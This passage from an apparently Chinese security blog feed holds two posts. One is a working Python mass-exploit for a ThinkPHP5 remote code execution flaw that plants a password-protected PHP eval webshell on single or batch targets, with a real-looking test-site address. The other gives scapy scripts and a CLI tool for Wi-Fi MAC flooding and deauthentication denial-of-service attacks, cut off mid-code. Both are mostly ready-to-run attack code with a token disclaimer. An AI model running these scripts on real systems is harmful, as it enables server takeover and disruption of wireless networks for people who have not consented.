class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line">#author:九世</span><br><span class="line">#version:python3</span><br><span class="line">#time:2019/1/11</span><br><span class="line">import requests</span><br><span class="line">import optparse</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">guanjianzi = &quot;PHP Version&quot;</span><br><span class="line">p1 = &apos;/public/index.php&apos;</span><br><span class="line">p2 = &apos;/index.php&apos;</span><br><span class="line">d1 = &apos;/haq.php&apos;</span><br><span class="line">d3 = &apos;/public/haq.php&apos;</span><br><span class="line">passwd = &apos;g&apos;</span><br><span class="line">headers = &#123;&apos;user-agent&apos;: &apos;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&apos;&#125;</span><br><span class="line">payload = &quot;_method=__construct&amp;filter[]=phpinfo&amp;method=get&amp;server[REQUEST_METHOD]=1&quot;</span><br><span class="line">payload2 = &quot;_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=echo &apos;haq&lt;?php @eval($_POST[g]);?&gt;&apos; &gt;&gt; haq.php&quot;</span><br><span class="line">payloads = &#123;&#125;</span><br><span class="line">payloads2 = &#123;&#125;</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    parser=optparse.OptionParser()</span><br><span class="line">    parser.add_option(&apos;-r&apos;,dest=&apos;rhost&apos;,help=&apos;set rhost&apos;)</span><br><span class="line">    parser.add_option(&apos;-s&apos;,dest=&apos;file&apos;,help=&apos;set file&apos;)</span><br><span class="line">    (option,args)=parser.parse_args()</span><br><span class="line">    if option.rhost:</span><br><span class="line">        rhost=option.rhost</span><br><span class="line">        danda(rhost)</span><br><span class="line">    elif option.file:</span><br><span class="line">        files=option.file</span><br><span class="line">        pilian(files)</span><br><span class="line">    else:</span><br><span class="line">        parser.print_help()</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">def danda(rhost):</span><br><span class="line">    if rhost!=&apos;&apos; or  &apos; &apos;:</span><br><span class="line">        mubiao=str(rhost).strip(&apos;/&apos;)</span><br><span class="line">    else:</span><br><span class="line">        print(&apos;[-] Not input &quot; &quot;&apos;)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    for z in payload.split(&apos;&amp;&apos;):</span><br><span class="line">        key, value = z.split(&apos;=&apos;, 1)</span><br><span class="line">        payloads[key] = value</span><br><span class="line"></span><br><span class="line">    for z in payload2.split(&apos;&amp;&apos;):</span><br><span class="line">        key, value = z.split(&apos;=&apos;, 1)</span><br><span class="line">        payloads2[key] = value</span><br><span class="line"></span><br><span class="line">    panduan=requests.get(url=mubiao+p1,headers=headers)</span><br><span class="line">    panduan2=requests.get(url=mubiao+p2,headers=headers)</span><br><span class="line">    if panduan.status_code==200:</span><br><span class="line">        print(&apos;[h] RHOST:&#123;&#125;&apos;.format(panduan.url))</span><br><span class="line">        rqt=requests.post(url=mubiao+&apos;&#123;&#125;?s=captcha&apos;.format(p1),headers=headers,data=payloads)</span><br><span class="line">        if guanjianzi in rqt.text:</span><br><span class="line">            print(&apos;[a] Found debug:&#123;&#125; status:&#123;&#125;&apos;.format(rqt.url,rqt.status_code))</span><br><span class="line">            if guanjianzi in rqt.text:</span><br><span class="line">                print(&apos;[a] Found debug:&#123;&#125;&apos;.format(rqt.url))</span><br><span class="line">                rqtws = requests.post(url=mubiao + &apos;&#123;&#125;?s=captcha&apos;.format(p1), headers=headers, data=payloads2)</span><br><span class="line">                rqt3s = requests.get(url=mubiao + &apos;&#123;&#125;&apos;.format(d3), headers=headers)</span><br><span class="line">                if &apos;haq&apos; in rqt3s.text and rqt3s.status_code == 200:</span><br><span class="line">                    print(&apos;[a] getshell ok url:&#123;&#125; password:&#123;&#125;&apos;.format(rqt3s.url, passwd))</span><br><span class="line">                else:</span><br><span class="line">                    print(&apos;[q] getshell fuck...&apos;)</span><br><span class="line">            else:</span><br><span class="line">                print(&apos;[q] Not Found:&#123;&#125; status:&#123;&#125;&apos;.format(rqt.url, rqt.status_code))</span><br><span class="line">        else:</span><br><span class="line">            print(&apos;[q] Not Found:&#123;&#125; status:&#123;&#125;&apos;.format(rqt.url,rqt.status_code))</span><br><span class="line">    elif panduan2.status_code==200:</span><br><span class="line">        print(&apos;[h] RHOST:&#123;&#125;&apos;.format(panduan2.url))</span><br><span class="line">        rqt=requests.post(url=mubiao+&apos;&#123;&#125;?s=captcha&apos;.format(p2),headers=headers,data=payloads)</span><br><span class="line">        if guanjianzi in rqt.text:</span><br><span class="line">            print(&apos;[a] Found debug:&#123;&#125;&apos;.format(rqt.url))</span><br><span class="line">            rqtw=requests.post(url=mubiao + &apos;&#123;&#125;?s=captcha&apos;.format(p2), headers=headers, data=payloads2)</span><br><span class="line">            rqt3=requests.get(url=mubiao+&apos;&#123;&#125;&apos;.format(d1),headers=headers)</span><br><span class="line">            if &apos;haq&apos; in rqt3.text and rqt3.status_code==200:</span><br><span class="line">                print(&apos;[a] getshell ok url:&#123;&#125; password:&#123;&#125;&apos;.format(rqt3.url,passwd))</span><br><span class="line">            else:</span><br><span class="line">                print(&apos;[q] getshell fuck...&apos;)</span><br><span class="line">        else:</span><br><span class="line">            print(&apos;[q] Not Found:&#123;&#125; status:&#123;&#125;&apos;.format(rqt.url,rqt.status_code))</span><br><span class="line">    else:</span><br><span class="line">        print(&apos;[q] del /index.php or /public/index.php&apos;)</span><br><span class="line"></span><br><span class="line">def pilian(files):</span><br><span class="line">    if files !=&apos;&apos; or &apos; &apos;:</span><br><span class="line">        file=files</span><br><span class="line">    else:</span><br><span class="line">        print(&apos;[-] Not input &quot; &quot;&apos;)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    fileq=file</span><br><span class="line">    if os.path.exists(fileq):</span><br><span class="line">        print(&apos;[h] Found &#123;&#125;&apos;.format(fileq))</span><br><span class="line">    else:</span><br><span class="line">        print(&apos;[q] Found &#123;&#125;&apos;.format(fileq))</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    for z in payload.split(&apos;&amp;&apos;):</span><br><span class="line">        key, value = z.split(&apos;=&apos;, 1)</span><br><span class="line">        payloads[key] = value</span><br><span class="line"></span><br><span class="line">    for z in payload2.split(&apos;&amp;&apos;):</span><br><span class="line">        key, value = z.split(&apos;=&apos;, 1)</span><br><span class="line">        payloads2[key] = value</span><br><span class="line"></span><br><span class="line">    dk=open(fileq,&apos;r&apos;)</span><br><span class="line">    for r in dk.readlines():</span><br><span class="line">        mubiao=&quot;&quot;.join(r.split(&apos;\n&apos;))</span><br><span class="line">        panduan = requests.get(url=mubiao + p1, headers=headers)</span><br><span class="line">        panduan2 = requests.get(url=mubiao + p2, headers=headers)</span><br><span class="line">        if panduan.status_code == 200:</span><br><span class="line">            print(&apos;[h] RHOST:&#123;&#125;&apos;.format(panduan.url))</span><br><span class="line">            rqt = requests.post(url=mubiao + &apos;&#123;&#125;?s=captcha&apos;.format(p1), headers=headers, data=payloads)</span><br><span class="line">            if guanjianzi in rqt.text:</span><br><span class="line">                print(&apos;[a] Found debug:&#123;&#125; status:&#123;&#125;&apos;.format(rqt.url, rqt.status_code))</span><br><span class="line">                if guanjianzi in rqt.text:</span><br><span class="line">                    print(&apos;[a] Found debug:&#123;&#125;&apos;.format(rqt.url))</span><br><span class="line">                    rqtws = requests.post(url=mubiao + &apos;&#123;&#125;?s=captcha&apos;.format(p1), headers=headers, data=payloads2)</span><br><span class="line">                    rqt3s = requests.get(url=mubiao + &apos;&#123;&#125;&apos;.format(d3), headers=headers)</span><br><span class="line">                    if &apos;haq&apos; in rqt3s.text and rqt3s.status_code == 200:</span><br><span class="line">                        print(&apos;[a] getshell ok url:&#123;&#125; password:&#123;&#125;&apos;.format(rqt3s.url, passwd))</span><br><span class="line">                    else:</span><br><span class="line">                        print(&apos;[q] getshell fuck...&apos;)</span><br><span class="line">                else:</span><br><span class="line">                    print(&apos;[q] Not Found:&#123;&#125; status:&#123;&#125;&apos;.format(rqt.url, rqt.status_code))</span><br><span class="line">            else:</span><br><span class="line">                print(&apos;[q] Not Found:&#123;&#125; status:&#123;&#125;&apos;.format(rqt.url, rqt.status_code))</span><br><span class="line">        elif panduan2.status_code == 200:</span><br><span class="line">            print(&apos;[h] RHOST:&#123;&#125;&apos;.format(panduan2.url))</span><br><span class="line">            rqt = requests.post(url=mubiao + &apos;&#123;&#125;?s=captcha&apos;.format(p2), headers=headers, data=payloads)</span><br><span class="line">            if guanjianzi in rqt.text:</span><br><span class="line">                print(&apos;[a] Found debug:&#123;&#125;&apos;.format(rqt.url))</span><br><span class="line">                rqtw = requests.post(url=mubiao + &apos;&#123;&#125;?s=captcha&apos;.format(p2), headers=headers, data=payloads2)</span><br><span class="line">                rqt3 = requests.get(url=mubiao + &apos;&#123;&#125;&apos;.format(d1), headers=headers)</span><br><span class="line">                if &apos;haq&apos; in rqt3.text and rqt3.status_code == 200:</span><br><span class="line">                    print(&apos;[a] getshell ok url:&#123;&#125; password:&#123;&#125;&apos;.format(rqt3.url, passwd))</span><br><span class="line">                else:</span><br><span class="line">                    print(&apos;[q] getshell fuck...&apos;)</span><br><span class="line">            else:</span><br><span class="line">                print(&apos;[q] Not Found:&#123;&#125; status:&#123;&#125;&apos;.format(rqt.url, rqt.status_code))</span><br><span class="line">        else:</span><br><span class="line">            print(&apos;[q] del /index.php or /public/index.php&apos;)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>测试：</p><p><img src="https://s2.ax1x.com/2019/01/11/FXIviF.png" alt="FXIviF.png"></p><p><img src="https://s2.ax1x.com/2019/01/11/FXo9MR.png" alt="FXo9MR.png"></p><p>实战测试：</p><p><img src="https://s2.ax1x.com/2019/01/11/FXIzRJ.png" alt="FXIzRJ.png"></p><p>测试站点：<a href="http://47.96.86.232:9999/" target="_blank" rel="noopener">FastAdmin - 基于ThinkPHP5和Bootstrap的极速后台开发框架</a></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>py_wifi_dos</title>
      <link href="/posts/37ff80c8.html"/>
      <url>/posts/37ff80c8.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>距离放寒假还有10天左右，这个星期继续在实验室折腾。突然对mdk3感兴趣，然后逐步了解写出一个脚本。</p><p><b>提醒：本文仅安全研究学习，若是违法被抓作者不负责</b><br><img src="http://pic.netbian.com/uploads/allimg/171111/221348-151040962861e7.jpg" alt="221348-151040962861e7.jpg"></p><h2 id="分析mdk3的攻击"><a href="#分析mdk3的攻击" class="headerlink" title="分析mdk3的攻击"></a>分析mdk3的攻击</h2><p>先开启网卡监听模式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start &lt;iface&gt;</span><br></pre></td></tr></table></figure></p><p>首先是<b>Mac洪水攻击</b>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mdk3 &lt;iface&gt; a -a &lt;bssid&gt;</span><br></pre></td></tr></table></figure></p><p>没攻击之前：<br><img src="https://s2.ax1x.com/2019/01/04/FT2zPU.png" alt="FT2zPU.png"></p><p>攻击中<br><img src="https://s2.ax1x.com/2019/01/04/FTRPM9.png" alt="FTRPM9.png"></p><p>wireshark抓到的包:<br><img src="https://s2.ax1x.com/2019/01/04/FTR5e1.md.png" alt="FTR5e1.md.png"></p><p><img src="https://s2.ax1x.com/2019/01/04/FTRLSe.png" alt="FTRLSe.png"></p><p>分析<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Receiver address： 接收地址（Client）</span><br><span class="line">Destination address：目的地地址（Client）</span><br><span class="line">Transmitter address：发射地址（AP）</span><br><span class="line">BSSID：BSSID</span><br></pre></td></tr></table></figure></p><p>猜想：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MAC水攻击也就是生成批量的MAC的地址，然后构造请求AP验证的数据包</span><br><span class="line">（也就是说只有请求包，不需要构造响应包）</span><br></pre></td></tr></table></figure></p><p>所以一和二为一样的，接着去scapy找对应的函数。<br><img src="https://s2.ax1x.com/2019/01/04/FTWewq.md.png" alt="FTWewq.md.png"><br><img src="https://s2.ax1x.com/2019/01/04/FTWUk6.md.png" alt="FTWUk6.md.png"></p><p>合三为一查看帮助：<br><img src="https://s2.ax1x.com/2019/01/04/FTW60I.png" alt="FTW60I.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RadioTap()经过对比，发现可以保持默认即可</span><br><span class="line">Dot11() 里的addr1填目标MAC地址，这里全部客户端攻击填写：FF:FF:FF:FF:FF:FF或者填指定的MAC</span><br><span class="line">addr2和addr3填AP地址</span><br><span class="line">Dot11Beacon() 保持默认或自行更改</span><br></pre></td></tr></table></figure><p>MAC洪水攻击代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">@author:九世</span><br><span class="line">@time:2019/1/3</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">from scapy.all import *</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">n=[]</span><br><span class="line">m=[]</span><br><span class="line"></span><br><span class="line">yser=input(&quot;RMAC:&quot;)</span><br><span class="line"></span><br><span class="line">def dos(mac):</span><br><span class="line">    for k in range(65, 71):</span><br><span class="line">        n.append(chr(k))</span><br><span class="line"></span><br><span class="line">    for q in range(0, 9):</span><br><span class="line">        m.append(q)</span><br><span class="line">    #批量生成MAC</span><br><span class="line">    for v in n:</span><br><span class="line">        for l in m:</span><br><span class="line">            for k in n:</span><br><span class="line">                for w in m:</span><br><span class="line">                    for s in n:</span><br><span class="line">                        for mq in m:</span><br><span class="line">                            for q in n:</span><br><span class="line">                                for p in m:</span><br><span class="line">                                    for o in n:</span><br><span class="line">                                        for g in m:</span><br><span class="line">                                            for we in n:</span><br><span class="line">                                                for wq in m:</span><br><span class="line">                                                    macs = &quot;&#123;&#125;&#123;&#125;:&#123;&#125;&#123;&#125;:&#123;&#125;&#123;&#125;:&#123;&#125;&#123;&#125;:&#123;&#125;&#123;&#125;:&#123;&#125;&#123;&#125;&quot;.format(v, l, k, w, s, mq, q,p, o, g, we, wq)</span><br><span class="line">                                                    data=RadioTap()/Dot11(subtype=11,addr1=&quot;ff:ff:ff:ff:ff:ff&quot;,addr2=&quot;&#123;&#125;&quot;.format(macs),addr3=mac,addr4=mac)/Dot11Beacon(timestamp=70180) #构造数据包</span><br><span class="line">                                                    sendp(data,iface=&quot;mon0&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    t=threading.Thread(target=dos,args=(&quot;&#123;&#125;&quot;.format(yser),))</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure><p>攻击效果：<br><img src="https://s2.ax1x.com/2019/01/04/FTWH7q.md.png" alt="FTWH7q.md.png"></p><p><b>Deauch attack攻击</b></p><blockquote><p>Deauch攻击就是伪造AP断开连接的数据包发送给AP还有客户端。造成无法连接到网络</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过刚刚说的话可以获得一个关键信息，我们要构造两个数据包。一个发送给AP一个发送给客户实现欺骗。</span><br></pre></td></tr></table></figure><p>wireshark抓包分析</p><p><img src="https://s2.ax1x.com/2019/01/04/FTf0U0.png" alt="FTf0U0.png"></p><p>欺骗AP<br><img src="https://s2.ax1x.com/2019/01/04/FTfs8U.png" alt="FTfs8U.png"></p><p>那么用到的scapy函数如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RadioTap()/Dot11()/Dot11Deauth()</span><br></pre></td></tr></table></figure><p>demo代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from scapy.all import *</span><br><span class="line"></span><br><span class="line">#构造一个发送给客户端的包和一个给AP的包</span><br><span class="line">while True:</span><br><span class="line">    deauth_pkt1 = RadioTap()/Dot11(addr1=&quot;ff:ff:ff:ff:ff:ff&quot;, addr2=&quot;&lt;you MAC&gt;&quot;, addr3=&quot;&lt;you MAC&gt;&quot;) / Dot11Deauth()</span><br><span class="line">    deauth_pkt2 = RadioTap()/Dot11(addr1=&quot;&lt;you MAC&gt;&quot;, addr2=&quot;ff:ff:ff:ff:ff:ff&quot;, addr3=&quot;ff:ff:ff:ff:ff:ff&quot;) / Dot11Deauth()</span><br><span class="line">    sendp(deauth_pkt1,iface=&quot;mon0&quot;)</span><br><span class="line">    sendp(deauth_pkt2,iface=&quot;mon0&quot;)</span><br></pre></td></tr></table></figure></p><p>测试结果：<br><img src="https://s2.ax1x.com/2019/01/04/FTfjat.md.png" alt="FTfjat.md.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">手机也有一个测试但是没有视频很难看出效果，给我师父可以拿代码自行测试</span><br></pre></td></tr></table></figure><h2 id="代码集合体"><a href="#代码集合体" class="headerlink" title="代码集合体"></a>代码集合体</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由于当事人的能力不足，导致自己处于不利的地位 --《小黑发金木*金木*340号 金木*小白发金木*佐佐木 绯世*黑色死神 金木*独眼之王 金木*天使形态 金木》</span><br></pre></td></tr></table></figure><p>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;&apos;</span><br><span class="line">@author:jiushi</span><br><span class="line">@time:2019/1/4</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">#-*-coding:utf-8-*-</span><br><span class="line">from scapy.all import *</span><br><span class="line">import optparse</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">banner=&quot;&quot;&quot;</span><br><span class="line">signature:今生今世非你不娶</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">print(banner)</span><br><span class="line">print(&apos;[!] Reminder: This tool needs to install the airmon-ng tool.&apos;)</span><br><span class="line">print(&apos;&apos;)</span><br><span class="line">print(&apos;&apos;)</span><br><span class="line">print(&apos;1.Generate a large number of mac addresses for flood attacks&apos;)</span><br><span class="line">print(&apos;2.Dot11Deauch attack&apos;)</span><br><span class="line">print(&apos;3.SSID and MAC scan&apos;)</span><br><span class="line">print(&apos;4.NIC open monitor mode&apos;)</span><br><span class="line">print(&apos;&apos;)</span><br><span class="line">print(&apos;&apos;)</span><br><span class="line"></span><br><span class="line">mac_list=[]</span><br><span class="line">ssid_list=[]</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    parser=optparse.OptionParser()</span><br><span class="line">    parser.add_option(&apos;-r&apos;,dest=&apos;rmac&apos;,help=&apos;rhost_mac&apos;)</span><br><span class="line">    parser.add_option(&apos;-m&apos;,dest=&apos;macaddresses&apos;,help=&apos;mac addresses&apos;,action=&apos;store_true&apos;)</span><br><span class="line">    parser.add_option(&apos;-d&apos;,dest=&apos;deauch&apos;,help=&apos;Deauch attack&apos;,action=&apos;store_true&apos;)</span><br><span class="line">    parser.add_option(&apos;-s&apos;,dest=&apos;scan&apos;,help=&apos;ssid and macscan&apos;,action=&apos;store_true&apos;)</span><br><span class="line">    parser.add_option(&apos;-f&apos;,dest=&apos;iface&apos;,help=&apos;network iface&apos;,action=&apos;store&apos;)</span><br><span class="line">    parser.add_option(&apos;-t&apos;,dest=&apos;start&apos;,help=&apos;nic open monitor mode&apos;,action=&apos;store_true&apos;)</span><br><span class="line">    (options,args)=parser.parse_args()</span><br><span class="line">    if options.macaddresses and options.iface and options.rmac:</span><br><span class="line">        ifaces=options.iface</span><br><span class="line">        rsmac=options.rmac</span><br><span class="line">        mac_addresses(ifaces,rsmac)</span><br><span class="line">    elif options.deauch and options.iface and options.rmac:</span><br><span class="line">        iface2=options.iface</span><br><span class="line">        rs2mac=options.rmac</span><br><span class="line">        attack(iface2,rs2mac)</span><br><span class="line">    elif options.scan and options.iface:</span><br><span class="line">        iface3=options.iface</span><br><span class="line">        xj=open(&apos;save.txt&apos;,&apos;w&apos;)</span><br><span class="line">        xj.close()</span><br><span class="line">        print(&apos;[+] SSID scan:&apos;)</span><br><span class="line">        print(&apos;[!] Ctrl+C stop&apos;)</span><br><span class="line">        print(&apos;&apos;)</span><br><span class="line">        print(&apos;&apos;)</span><br><span class="line">        sniff(iface=iface3,prn=scan)</span><br><span class="line">    elif options.start and options.iface:</span><br><span class="line">        iface0=options.iface</span><br><span class="line">        start(iface0)</span><br><span class="line">    else:</span><br><span class="line">        parser.print_help()</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">def mac_addresses(iface1,rsmac):</span><br><span class="line">    print(&apos;[+] mac_addresses&apos;)</span><br><span class="line">    print(&apos;&apos;)</span><br><span class="line">    n=[]</span><br><span class="line">    m=[]</span><br><span class="line">    for k in range(65, 71):</span><br><span class="line">        n.append(chr(k))</span><br><span class="line"></span><br><span class="line">    for q in range(0, 9):</span><br><span class="line">        m.append(q)</span><br><span class="line">    for v in n:</span><br><span class="line">        for l in m:</span><br><span class="line">            for k in n:</span><br><span class="line">                for w in m:</span><br><span class="line">                    for s in n:</span><br><span class="line">                        for mq in m:</span><br><span class="line">                            for q in n:</span><br><span class="line">                                for p in m:</span><br><span class="line">                                    for o in n:</span><br><span class="line">                                        for g in m:</span><br><span class="line">                                            for we in n:</span><br><span class="line">                                                for wq in m:</span><br><span class="line">                                                    macss = &quot;&#123;&#125;&#123;&#125;:&#123;&#125;&#123;&#125;:&#123;&#125;&#123;&#125;:&#123;&#125;&#123;&#125;:&#123;&#125;&#123;&#125;:&#123;&#125;&#123;&#125;&quot;.format(v, l, k, w, s, mq, q,p, o, g, we, wq)</span><br><span class="line">                                                    data=RadioTap()/Dot11(subtype=11,addr1=&quot;ff:ff:ff:ff:ff:ff&quot;,addr2=&quot;&#123;&#125;&quot;.format(macss),addr3=rsmac,addr4=rsmac)/Dot11Beacon(timestamp=70180)</span><br><span class="line">                                                    sendp(data,iface=iface1)</span><br><span class="line"></span><br><span class="line">def attack(iface2,rs2mac):</span><br><span class="line">    print(&apos;[+] Dot11Deauth attak&apos;)</span><br><span class="line">    print(&apos;&apos;)</span><br><span class="line">    while True:</span><br><span class="line">        data2=RadioTap()/Dot11(addr1=&quot;ff:ff:ff:ff:ff:ff&quot;,addr2=rs2mac,addr3=rs2mac)/Dot11Deauth()</span><br><span class="line">        data3=RadioTap()/Dot11(addr1=rs2mac,addr2=&quot;ff:ff:ff:ff:ff:ff&quot;,addr3=&quot;ff:ff:ff:ff:ff:ff&quot;)/Dot11Deauth()</span><br><span class="line">        sendp(data2,iface=iface2)</span><br><span class="line">        sendp(data3,iface=iface2)</span><br><span class="line"></span><br><span class="line">def scan(jianting):</span><br><span class="line">    if jianting.haslayer(Dot11Elt):</span><br><span class="line">        if jianting.type==0 and jianting.subtype==8:</span><br><span class="line">            if not jianting.addr2 in mac_list:</span><br><span class="line">                mac_list.append(jianting.addr2)</span><br><span class="line">                ssid_list.append(jianting.info)</span><br><span class="line">            